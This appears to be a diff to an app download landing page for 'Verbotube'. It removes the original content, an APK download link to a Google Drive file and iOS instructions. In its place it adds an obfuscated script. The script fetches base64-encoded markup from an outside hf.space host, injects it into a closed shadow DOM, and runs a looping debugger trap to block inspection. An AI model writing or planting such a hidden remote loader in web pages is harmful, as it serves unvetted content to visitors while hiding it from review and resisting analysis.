@@ -38,51 +38,19 @@
 </head>
 <body>
 
-    <div class="logo-area">
-        <img src="icon.png" class="logo-img">
-    </div>
-
-    <h1>Verbotube</h1>
-    <p>Watch. Create. Go Viral.<br>Download the App now.</p>
-
-    <div class="btn-container">
-        <a id="androidBtn" href="https://link-to-be-replaced-manually.com" class="download-btn">
-            <i class="fab fa-android"></i> Download APK
-        </a>
-
-        <div id="iosPanel" class="ios-instruction">
-            <h3 style="margin-top:0; color:white;">For iPhone Users:</h3>
-            <div class="step"><i class="fas fa-share-square"></i> Tap the <b>Share</b> button below.</div>
-            <div class="step"><i class="fas fa-plus-square"></i> Select <b>"Add to Home Screen"</b>.</div>
-            <div class="step"><i class="fas fa-check-circle"></i> Open App from Home Screen.</div>
-        </div>
-
-    </div>
-
-    <p style="margin-top: 30px; font-size: 11px; opacity: 0.5;">Version 1.0 • Secure Build</p>
-
-    <script>
-        // Direct Download Link Setup
-        const driveID = "1pU_unycv3eXonj-ea1DsAhNjzPmNub7_";
-        const directLink = `https://drive.google.com/uc?export=download&id=${driveID}`;
-        
-        const androidBtn = document.getElementById('androidBtn');
-        const iosPanel = document.getElementById('iosPanel');
-        
-        // Link update kar rahe hain
-        androidBtn.href = directLink;
-
-        // Check Device Type
-        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-
-        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-            androidBtn.style.display = 'none';
-            iosPanel.style.display = 'block';
-        } else {
-            iosPanel.style.display = 'none';
-            androidBtn.style.display = 'flex';
-        }
-    </script>
-
+<div id="px-root"></div>
+<script>
+(async function(){
+ try{
+  const r=await fetch('https://elitegamer859650-paradox-ghost-security.hf.space/get-shield?id=px_ef0807');
+  const d=await r.json();
+  const p=JSON.parse(atob(d.p));
+  const root=document.getElementById('px-root');
+  const shadow=root.attachShadow({mode:'closed'});
+  shadow.innerHTML=p.html;
+  setInterval(()=>{debugger;},500);
+ }catch(e){document.body.innerHTML='Paradox Security: Node Offline';}
+})();
+</script>
 </body>
 </html>
